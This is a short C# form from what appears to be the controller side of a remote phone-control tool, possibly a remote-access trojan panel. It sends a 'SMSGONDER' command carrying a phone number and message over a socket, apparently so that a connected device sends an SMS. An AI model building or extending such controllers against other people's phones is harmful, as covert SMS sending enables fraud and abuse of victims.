using System;
using System.Net.Sockets;
using System.Text;

namespace SV
{
    public partial class SMS : MetroFramework.Forms.MetroForm
    {
        Socket s;
        public SMS(Socket socket, string num)
        {
            InitializeComponent();
            s = socket;
            textBox1.Text = num;
            button1.Click += button1_Click;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text != "" && textBox2.Text != "")
            {
                try
                {
                    byte[] senddata = Form1.MyDataPacker("SMSGONDER", Encoding.UTF8.GetBytes(textBox1.Text + "=" + textBox2.Text));
                    s.Send(senddata, 0, senddata.Length, SocketFlags.None);                   
                }
                catch (Exception) { }
                Close();
            }
        }
    }
}
